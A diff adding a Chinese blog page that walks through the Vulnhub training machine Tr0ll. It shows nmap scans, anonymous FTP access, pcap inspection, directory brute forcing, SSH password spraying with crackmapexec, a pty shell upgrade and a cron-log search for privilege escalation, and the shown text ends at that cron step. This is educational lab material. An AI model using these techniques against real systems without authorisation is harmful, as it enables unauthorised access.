@@ -1,0 +1,1261 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——靶机精炼-思路为王（三） | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——靶机精炼-思路为王（三）`
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://lmlsama.top/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"W","cover":"/images/default-cover.webp","path":"2026/03/13/W/"},{"title":"W1R3S 1.0.1 靶机","cover":"/images/default-cover.webp","path":"2026/03/13/W1R3S 1.0.1 靶机/"},{"title":"域渗透","cover":"/images/default-cover.webp","path":"2026/03/13/域渗透/"},{"title":"票据攻击","cover":"/images/default-cover.webp","path":"2026/03/19/票据攻击/"},{"title":"靶机精炼-思路为王（四）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（四）/"},{"title":"靶机精炼-思路为王（三）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（三）/"},{"title":"靶机精炼-思路为王（一）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（一）/"},{"title":"靶机精炼-思路为王（二）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（二）/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">lmlsama</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">kong</span>
+          <span class="main-left--tag">kong</span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“井底之蛙，虽不曾见过大海”</p>
+        <p>“但知晓天之湛蓝”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a target="_blank" rel="noopener" href="https://github.com/LMLsama/LMLsama.github.io"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>2</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>2</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>1 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>8 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1494天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">靶机精炼-思路为王（三）</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2026-03-20 15:30:33</p>
+        </div>
+        <img src="/images/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h1 id="Tr0ll-没有大招的一次渗透，却包含-10-多种技巧。"><a href="#Tr0ll-没有大招的一次渗透，却包含-10-多种技巧。" class="headerlink" title="Tr0ll - 没有大招的一次渗透，却包含 10 多种技巧。"></a>Tr0ll - 没有大招的一次渗透，却包含 10 多种技巧。</h1><p><strong>靶机精讲之 Tr0ll ，vulnhub 靶机，没有大招，但都是不可或缺的小技巧。用到 FTP 的使用技巧、File 命令、binwalk 命令、strings 命令、Wireshark 包文件、黑丝（黑客思路）、Leetspeak、Crackmapexec、hydra、Find 命令技巧、系统命令。</strong></p>
+<h2 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn ip/24</span><br><span class="line">sudo nmap --min-rate 10000 -p- ip</span><br><span class="line">sudo nmap --min-rate 10000 -sU -p- ip</span><br><span class="line">sudo nmap -sT -sV -O -p,,,, ip</span><br><span class="line">sudo nmap --script=vuln -p,,,, ip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221501.png" alt="image-20251117192631518"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221503.png" alt="image-20251117192655949"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221504.png" alt="image-20251117193617446"></p>
+<p><strong>这时仅这一步 ai 给出的渗透方向建议</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221505.png" alt="image-20251117192825891"></p>
+<p><strong>无 UDP 开放</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221506.png" alt="image-20251117192728332"></p>
+<p><strong>22 排后，21 和 80 重点看</strong></p>
+<h2 id="FTP-渗透"><a href="#FTP-渗透" class="headerlink" title="FTP 渗透"></a>FTP 渗透</h2><p><strong>因为没有密码</strong></p>
+<h3 id="尝试-ftp-匿名登陆"><a href="#尝试-ftp-匿名登陆" class="headerlink" title="尝试 ftp 匿名登陆"></a>尝试 ftp 匿名登陆</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ftp ip</span><br><span class="line">用户名：anonymous</span><br><span class="line">密码：空</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221507.png" alt="image-20251117193147225"></p>
+<p><strong>发现确实能登录，看看有哪些文件</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221508.png" alt="image-20251117193404163"></p>
+<blockquote>
+<p><strong>.pcap</strong> 后缀的一般为流量文件，用 wireshark 打开    **	**扩展名 <code>.pcap</code> 代表 <strong>Packet Capture</strong>。</p>
+<p><strong>binary</strong> 将文件转化为二进制：切换到<strong>二进制传输模式</strong>，确保文件在传输过程中不会被修改（适用于非文本文件，如 <code>.pcap</code>、<code>.exe</code>、<code>.jpg</code> 等）。</p>
+<p><strong>返回</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">200 Switching to Binary mode.</span><br></pre></td></tr></table></figure>
+
+<p><strong>表示切换成功。</strong></p>
+<p><strong>get 文件名</strong>          即可下载</p>
+</blockquote>
+<h3 id="✅-AI-下一步建议："><a href="#✅-AI-下一步建议：" class="headerlink" title="✅ AI 下一步建议："></a>✅ AI 下一步建议：</h3><p><strong>你现在得到了一个 <strong><code>.pcap</code> 文件，这是</strong>网络抓包文件</strong>，可以用 <strong>Wireshark</strong> 打开分析，寻找敏感信息（如明文密码、HTTP 请求、FTP 凭证、DNS 查询等）。</p>
+<h4 id="🔍-分析命令（本地）："><a href="#🔍-分析命令（本地）：" class="headerlink" title="🔍 分析命令（本地）："></a>🔍 分析命令（本地）：</h4><p><strong>bash</strong></p>
+<p><strong>复制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wireshark lol.pcap</span><br></pre></td></tr></table></figure>
+
+<h4 id="🔍-快速提取信息（命令行）："><a href="#🔍-快速提取信息（命令行）：" class="headerlink" title="🔍 快速提取信息（命令行）："></a>🔍 快速提取信息（命令行）：</h4><p><strong>1</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 提取HTTP请求</span><br><span class="line">tcpdump -r lol.pcap -A | grep &quot;GET\|POST&quot;</span><br><span class="line"></span><br><span class="line"># 提取FTP用户名密码</span><br><span class="line">tcpdump -r lol.pcap -A | grep &quot;USER\|PASS&quot;</span><br><span class="line"></span><br><span class="line"># 查看所有TCP流</span><br><span class="line">tshark -r lol.pcap -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>**如果你把 **<code>lol.pcap</code> 文件内容贴出来，或者告诉我你发现了什么，我可以帮你进一步分析是否藏有登录凭据、Web 路径、或其他突破口。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221509.png" alt="image-20251117194129868"></p>
+<p><strong>我们这里先不用 wireshark 试试</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221510.png" alt="image-20251117195321852"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings lol.pcap</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><strong>作用：把****二进制文件</strong>（这里是抓包文件）里所有<strong>可打印字符串</strong>强行提出来，方便快速浏览，而不用开 Wireshark。</li>
+<li>**适用场景：CTF 或内网应急时，只想 5 秒钟看出有没有口令、路径、彩蛋，先 **<code>strings</code> 再决定要不要深入解析。</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th><strong>原始字符串</strong></th>
+<th><strong>解释</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Linux 3.12-kali1-486</code></td>
+<td><strong>抓包机用的系统版本（攻击机&#x2F;受害者都有可能）。</strong></td>
+</tr>
+<tr>
+<td><code>Dumpcap 1.10.2 ...</code></td>
+<td><strong>抓包工具本身的信息，相当于“录像机型号”。</strong></td>
+</tr>
+<tr>
+<td><code>eth0</code></td>
+<td><strong>抓包接口，说明当时是从以太网口抓的。</strong></td>
+</tr>
+<tr>
+<td><code>host 10.0.0.6</code></td>
+<td><strong>抓包时可能写了“只抓跟 10.0.0.6 有关的包”这样的过滤条件。</strong></td>
+</tr>
+<tr>
+<td><code>220 (vsFTPd 3.0.2)</code></td>
+<td><strong>FTP 服务横幅，告诉你对面跑的是 vsftpd 3.0.2。</strong></td>
+</tr>
+<tr>
+<td><code>USER anonymous</code></td>
+<td><strong>客户端发送“我要用匿名账号”。</strong></td>
+</tr>
+<tr>
+<td><code>331 Please specify the password.</code></td>
+<td><strong>服务器回应“可以，给个密码”。</strong></td>
+</tr>
+<tr>
+<td><code>PASS password</code></td>
+<td><strong>客户端真的发了明文密码“password”（典型弱口令&#x2F;CTF 彩蛋）。</strong></td>
+</tr>
+<tr>
+<td><code>230 Login successful.</code></td>
+<td><strong>登录成功，匿名访问被允许。</strong></td>
+</tr>
+<tr>
+<td><code>SYST</code></td>
+<td><strong>客户端询问服务器系统类型。</strong></td>
+</tr>
+<tr>
+<td><code>215 UNIX Type: L8</code></td>
+<td><strong>服务器回答“类 Unix”。</strong></td>
+</tr>
+<tr>
+<td><code>PORT 10,0,0,12,173,198</code></td>
+<td><strong>客户端开主动模式，把本地 IP 10.0.0.12 和端口</strong><code>(173&lt;&lt;8)+198=44546</code> 告诉服务器。</td>
+</tr>
+<tr>
+<td><code>LIST</code></td>
+<td><strong>列目录。</strong></td>
+</tr>
+<tr>
+<td><code>-rw-r--r-- ... secret_stuff.txt</code></td>
+<td><strong>目录里有一个普通文件，名字是</strong><code>secret_stuff.txt</code>。</td>
+</tr>
+<tr>
+<td><code>TYPE I</code></td>
+<td><strong>切换成二进制传输模式。</strong></td>
+</tr>
+<tr>
+<td><code>RETR secret_stuff.txt</code></td>
+<td><strong>客户端要求下载这个文件。</strong></td>
+</tr>
+<tr>
+<td><code>well, well, well ... sup3rs3cr3tdirlol :-P</code></td>
+<td><strong>文件正文被 strings 直接爆了出来</strong>——这就是彩蛋&#x2F;提示旗。                               supersecretdirlol <strong>超级秘密目录 lol</strong> <strong>leetspeak</strong></td>
+</tr>
+<tr>
+<td><code>Sucks, you were so close ... TRY HARDER!</code></td>
+<td><strong>继续嘲讽，告诉你“差一点，继续挖”。</strong></td>
+</tr>
+<tr>
+<td><code>QUIT</code></td>
+<td><strong>退出会话。</strong></td>
+</tr>
+<tr>
+<td><code>221 Goodbye.</code></td>
+<td><strong>服务器再见。</strong></td>
+</tr>
+</tbody></table>
+<p><strong>从这段输出我们能立刻得到的情报</strong></p>
+<ol>
+<li><strong>明文凭证</strong> **账号 **<code>anonymous</code>，密码 <code>password</code>——下次可以直接 <code>ftp 10.x.x.x</code> 然后敲这俩字，无需爆破。</li>
+<li><strong>主动模式 vs 被动模式</strong> **客户端用了 **<code>PORT</code> 命令（主动模式），如果你在 NAT 后抓包复现失败，记得切被动模式 <code>passive</code>。</li>
+<li><strong>strings 的局限性</strong> <strong>只能看见连续可打印字符；如果文件内容被压缩、编码、分片，就扫不出来，所以****strings 只是“侦察”，不是“终审”</strong>。</li>
+</ol>
+<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><h3 id="根据提示信息获取文件"><a href="#根据提示信息获取文件" class="headerlink" title="根据提示信息获取文件"></a>根据提示信息获取文件</h3><p><strong>隐藏彩蛋路径</strong> **文件里出现 **<code>sup3rs3cr3tdirlol</code>，十有八九是下一个目录或文件名，直接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; cd sup3rs3cr3tdirlol</span><br></pre></td></tr></table></figure>
+
+<p>**或者浏览器访问 **<code>http://靶机IP/sup3rs3cr3tdirlol</code> 就能继续剧情。</p>
+<p><strong>supersecretdirlol</strong>	**超级秘密目录 lol **	<strong>leetspeak</strong></p>
+<p>**要是真想不到访问该目录，但可以想到与目录相关，**<strong>直接 dirb 目录爆破</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221511.png" alt="image-20251117195755782"></p>
+<p><strong>发现确实有这个目录，下载该目录下的文件</strong></p>
+<h3 id="查看文件的具体步骤"><a href="#查看文件的具体步骤" class="headerlink" title="查看文件的具体步骤"></a>查看文件的具体步骤</h3><p><strong>file 作用：拿到应该新文件时，要看这个文件的属性</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221512.png" alt="image-20251117200320186"></p>
+<blockquote>
+<p><code>file</code> 是 Linux&#x2F;Unix 自带的“<strong>文件体检仪</strong>”——<strong>不依赖扩展名</strong>，直接读文件头（magic bytes）告诉你“它到底是什么”。</p>
+<p>**一句话：**<strong>扩展名可以撒谎，<code>file</code> 不会。</strong></p>
+<ul>
+<li><strong>只能读****文件头</strong>，对纯加密、无特征容器会报 <code>data</code>。</li>
+<li><strong>高度碎片化或损坏的文件可能误判。</strong></li>
+<li><strong>遇到****复合文件</strong>（图种、图马）只报外层类型，需要二次分离。</li>
+</ul>
+<p><code>file</code> 命令就是“<strong>不看扩展名，直接看 DNA</strong>”的快捷工具；在取证、逆向、CTF、恶意软件分析里，它永远是<strong>第一步“摸脉”</strong>，先知道“我是谁”，再决定“怎么拆”。</p>
+</blockquote>
+<p><strong>binwalk 作用：查看是否有捆绑（多层）</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221513.png" alt="image-20251117200412257"></p>
+<blockquote>
+<p><code>binwalk</code> 就是“<strong>文件洋葱剥离器</strong>”——<strong>自动一层层剥开固件&#x2F;镜像&#x2F;杂项文件，把里面藏的每一坨数据（压缩包、文件系统、证书、内核、甚至隐藏图片）全挖出来</strong>，还能提示每段数据的偏移和类型。</p>
+<p>**一句话：**<strong>别人给你一个 <code>bin</code> 不知里头有啥，先 <code>binwalk</code> 一下，秒变透明。</strong></p>
+</blockquote>
+<p><strong>strings 作用：以字符形式查看文件</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221514.png" alt="image-20251117201106936"></p>
+<p><strong>这里说，找到****16 进制的该地址</strong></p>
+<p><strong>这个****地址</strong>指定是：url 地址&#x2F;即目录？**	<strong>||||||         内存地址？</strong>	<strong>&#x2F;&#x2F;溢出？</strong>	**二进制？涉及可执行文件了</p>
+<p><strong>要试试，最简单，最无损的就是地址</strong></p>
+<details><summary>AI提供的下一步思路</summary>
+
+</details>
+
+<p>**作为 url 的地址&#x2F;目录，最简单，换着页面试，现在知道的页面也没几个&#x2F;&#x2F;**<strong>目录爆破？感觉很有用啊…</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221515.png" alt="image-20251117201916259"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221516.png" alt="image-20251117202023575"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221517.png" alt="image-20251117202328192"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221518.png" alt="image-20251117202426406"></p>
+<p><strong>既有命令，关键词，还有类似用户名的字符</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221519.png" alt="image-20251117202640591"></p>
+<p>**他说上面这张图片是密码：****Good_job_:) **</p>
+<p><strong>就这一个密码</strong></p>
+<h2 id="22-端口-ssh-密码喷射-crackmapexec"><a href="#22-端口-ssh-密码喷射-crackmapexec" class="headerlink" title="22 端口 ssh 密码喷射 crackmapexec"></a>22 端口 ssh 密码喷射 crackmapexec</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo crackmapexec ssh 目标ip -u 充当用户名的文件 -p 充当密码的文件 --continue-on-success</span><br><span class="line"></span><br><span class="line">--continue-on-success指即使找到一对成功了，也要全部试完</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221520.png" alt="image-20251117203030585"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221521.png" alt="image-20251117203452459"></p>
+<p><strong>一开始还说失败，后面说无法连接了，说明****对方的 ssh 可能做了限制，多次输入无效后封禁一段时间</strong></p>
+<p><strong>对于我们这种密码对少的，可以调换个个儿，反向执行，直到全部试完</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221522.png" alt="image-20251117203736192"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221523.png" alt="image-20251117203942519"></p>
+<p><strong>还是无法匹配用户名密码，我们要发散的去想</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221524.png" alt="image-20251117204057419"></p>
+<p><strong>但是，他这个目录说了，目录里包含密码，那这个文件名会不会是密码呢？即密码是：Pass.txt</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221525.png" alt="image-20251117204216982"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221526.png" alt="image-20251117204306730"></p>
+<h3 id="竟然真成功了。。。。"><a href="#竟然真成功了。。。。" class="headerlink" title="竟然真成功了。。。。"></a>竟然真成功了。。。。</h3><h2 id="获得初始-shell"><a href="#获得初始-shell" class="headerlink" title="获得初始 shell"></a>获得初始 shell</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221527.png" alt="image-20251117204506525"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221528.png" alt="image-20251117204804646"></p>
+<h3 id="获得更好交互式-shell"><a href="#获得更好交互式-shell" class="headerlink" title="获得更好交互式 shell"></a>获得更好交互式 shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看自动任务"><a href="#查看自动任务" class="headerlink" title="查看自动任务"></a>查看自动任务</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221529.png" alt="image-20251117204900823"></p>
+<h3 id="查看目录和文件"><a href="#查看目录和文件" class="headerlink" title="查看目录和文件"></a>查看目录和文件</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221530.png" alt="image-20251117204929047"></p>
+<p><strong>家目录下的 troll 用户，没有隐藏文件 ssh，也就没有公钥私钥之说了</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221531.png" alt="image-20251117205140018"></p>
+<p><strong>查看 web 目录下的文件，系统里面是有日志的 syslog</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221532.png" alt="image-20251117205405410"></p>
+<p><strong>这里我们翻找目录以及文件的时候，系统突然退出了</strong></p>
+<p><strong>告诉我们时间到了，那****系统里面有些程序在自动执行，不是由于故障，或者被管理员剔下来了</strong></p>
+<p><strong>再次进入（赶时间）</strong></p>
+<h2 id="自动任务提权"><a href="#自动任务提权" class="headerlink" title="自动任务提权"></a>自动任务提权</h2><p><strong>上面我们搜索 crontab，不让我们搜，那我们看看相关日志能不能找到（find）</strong></p>
+<p><strong>因为我们权限很低，搜的时候记得把错误信息丢掉，否则****信息洪水</strong>，错误信息很多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name cronlog 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>部分</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>find /</code></td>
+<td><strong>从根目录开始递归扫描整个文件系统。</strong></td>
+</tr>
+<tr>
+<td><code>-name cronlog</code></td>
+<td><strong>只匹配****文件名</strong>恰好是 <code>cronlog</code> 的文件（区分大小写）。</td>
+</tr>
+<tr>
+<td><code>2&gt;/dev/null</code></td>
+<td><strong>把标准错误（权限拒绝、丢失文件等）重定向到黑洞，屏幕只保留真正结果，清爽。</strong></td>
+</tr>
+</tbody></table>
+<p>**如果没搜到可能叫 **<strong>cron.log</strong>、<strong>cron</strong>、<strong>syslog</strong>、<strong>messages</strong>… 换关键词再扫：</p>
+</blockquote>
